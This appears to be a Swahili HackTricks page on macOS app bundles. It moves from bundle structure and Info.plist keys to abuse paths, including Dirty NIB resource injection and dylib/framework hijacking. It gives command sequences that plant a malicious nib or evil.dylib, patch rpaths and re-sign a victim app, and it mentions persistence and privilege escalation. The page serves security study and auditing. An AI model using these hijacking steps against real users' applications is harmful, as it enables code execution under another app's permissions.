# Bundles za macOS

{{#include ../../../banners/hacktricks-training.md}}

## Taarifa za Msingi

Bundles katika macOS hutumika kama vyombo vya kuhifadhi rasilimali mbalimbali ikiwemo applications, libraries, na faili nyingine muhimu, na kuonekana kama vitu vimoja katika Finder, kama faili za kawaida `*.app`. Bundle inayokutana nayo mara nyingi ni `.app` bundle, ingawa aina nyingine kama `.framework`, `.systemextension`, na `.kext` pia ni za kawaida.

### Vipengele Muhimu vya Bundle

Ndani ya bundle, hasa ndani ya saraka `<application>.app/Contents/`, rasilimali mbalimbali muhimu zimehifadhiwa:

- **\_CodeSignature**: Saraka hii inaweka maelezo ya code-signing muhimu kwa kuthibitisha uadilifu wa application. Unaweza kukagua taarifa za code-signing kwa kutumia amri kama:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Inahifadhi binary inayotekelezwa ya programu ambayo inaendeshwa wakati mtumiaji anaiendesha.
- **Resources**: Hifadhi kwa vipengele vya kiolesura vya programu, ikiwa ni pamoja na picha, nyaraka, na maelezo ya kiolesura (nib/xib files).
- **Info.plist**: Inafanya kazi kama faili kuu la usanidi la programu, muhimu kwa mfumo kutambua na kuingiliana na programu ipasavyo.

#### Vifunguo Muhimu katika Info.plist

Faili ya `Info.plist` ni nguzo ya usanidi wa programu, ikijumuisha vifunguo kama vile:

- **CFBundleExecutable**: Inabainisha jina la faili kuu inayotekelezwa iliyoko katika saraka `Contents/MacOS`.
- **CFBundleIdentifier**: Hutoa kitambulisho cha kipekee kwa programu, kinachotumiwa sana na macOS kwa usimamizi wa programu.
- **LSMinimumSystemVersion**: Inaonyesha toleo la chini kabisa la macOS linalohitajika kwa programu kuendesha.

### Kuchunguza Bundles

Ili kuchunguza yaliyomo ndani ya bundle, kama `Safari.app`, amri ifuatayo inaweza kutumika: `bash ls -lR /Applications/Safari.app/Contents`

Uchunguzi huu unaonyesha saraka kama `_CodeSignature`, `MacOS`, `Resources`, na faili kama `Info.plist`, kila moja ikihudumia kusudi tofauti kutoka kwenye usalama wa programu hadi kufafanua kiolesura chake cha mtumiaji na vigezo vya utendakazi.

#### Saraka za Ziada za Bundle

Zaidi ya saraka za kawaida, bundles pia zinaweza kujumuisha:

- **Frameworks**: Inajumuisha frameworks zilizobundled zinazotumika na programu. Frameworks ni kama dylibs zenye rasilimali za ziada.
- **PlugIns**: Saraka kwa plug-ins na extensions zinazoongeza uwezo wa programu.
- **XPCServices**: Inahifadhi huduma za XPC zinazotumiwa na programu kwa mawasiliano nje ya mchakato.

Muundo huu unahakikisha kwamba vipengele vyote vinavyohitajika vimefungwa ndani ya bundle, kurahisisha mazingira ya programu yenye muundo wa moduli na salama.

Kwa maelezo zaidi kuhusu vifunguo vya `Info.plist` na maana yake, nyaraka za Apple developer zinatoa rasilimali nyingi: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Vidokezo vya Usalama & Njia za Matumizi Mabaya

- **Gatekeeper / App Translocation**: Wakati bundle iliyowekwa karantini inapotumika kwa mara ya kwanza, macOS hufanya uthibitisho wa kina wa saini na inaweza kuikimbia kutoka kwenye njia iliyotranslocate iliyopangwa kwa nasibu. Mara inaporuhusiwa, uzinduzi wa baadaye hufanya ukaguzi mdogo tu; faili za rasilimali katika `Resources/`, `PlugIns/`, nibs, n.k., kihistoria hazikuwa zikikaguliwa. Tangu macOS 13 Ventura, ukaguzi wa kina umewekewa nguvu kwenye uzinduzi wa kwanza na ruhusa mpya ya *App Management* ya TCC inapunguza michakato ya tatu kuharibu bundles za wengine bila ridhaa ya mtumiaji, lakini mifumo ya zamani bado iko katika hatari.
- **Bundle Identifier collisions**: Malengo mengi yaliyowekwa ndani (PlugIns, helper tools) yanayotumia `CFBundleIdentifier` sawa yanaweza kuvunja uthibitisho wa saini na mara nyingine kuwezesha utekaji/konfuzia wa URL‑scheme. Daima orodhesha sub‑bundles na thibitisha IDs za kipekee.

## Resource Hijacking (Dirty NIB / NIB Injection)

Kabala ya Ventura, kubadilisha rasilimali za UI katika app iliyosainiwa kuliweza kupitisha ukaguzi mdogo wa saini ya msimbo na kusababisha utekelezaji wa msimbo kwa entitlements za app. Utafiti wa sasa (2024) unaonyesha hili bado linafanya kazi kwenye pre‑Ventura na kwenye builds ambazo hazijekwa karantini:

1. Nakili app lengwa kwenye eneo linaloweza kuandikwa (mfano, `/tmp/Victim.app`).
2. Badilisha `Contents/Resources/MainMenu.nib` (au nib yoyote iliyo deklarwa katika `NSMainNibFile`) na nib hasidi inayoumba/inaanzisha `NSAppleScript`, `NSTask`, n.k.
3. Zindua app. Nib hasidi itaendeshwa chini ya bundle ID ya mwathirika na entitlements zake (ruksa za TCC, kipaza sauti/kamera, n.k.).
4. Ventura+ hupunguza hatari kwa kufanya uthibitisho wa kina wa bundle kwenye uzinduzi wa kwanza na kuhitaji ruhusa ya *App Management* kwa mabadiliko ya baadaye, hivyo kudumu ni ngumu zaidi lakini mashambulizi ya uzinduzi wa awali kwenye macOS za zamani bado yanaweza kutumika.

Mfano wa payload mdogo wa nib hasidi (compile xib to nib with `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking inside Bundles

Kwa sababu utafutaji wa `@rpath` hupendelea Frameworks/PlugIns zilizomo ndani ya bundle, kuacha maktaba yenye madhara ndani ya `Contents/Frameworks/` au `Contents/PlugIns/` kunaweza kubadilisha mfululizo wa upakiaji wakati binary kuu imesainiwa bila uthibitishaji wa maktaba au ikiwa upangaji wa `LC_RPATH` ni dhaifu.

Hatua za kawaida wakati wa kutumia bundle isiyo na saini/ad‑hoc:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Vidokezo:
- Hardened runtime, ikiwa `com.apple.security.cs.disable-library-validation` haipo, inazuia third‑party dylibs; angalia entitlements kwanza.
- XPC services chini ya `Contents/XPCServices/` mara nyingi hu-load sibling frameworks—patch binaries zao kwa namna ile ile kwa persistence au privilege escalation paths.

## Muhtasari wa Ukaguzi wa Haraka
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Marejeleo

- [Bringing process injection into view(s): exploiting macOS apps using nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [Dirty NIB & bundle resource tampering write‑up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)
{{#include ../../../banners/hacktricks-training.md}}
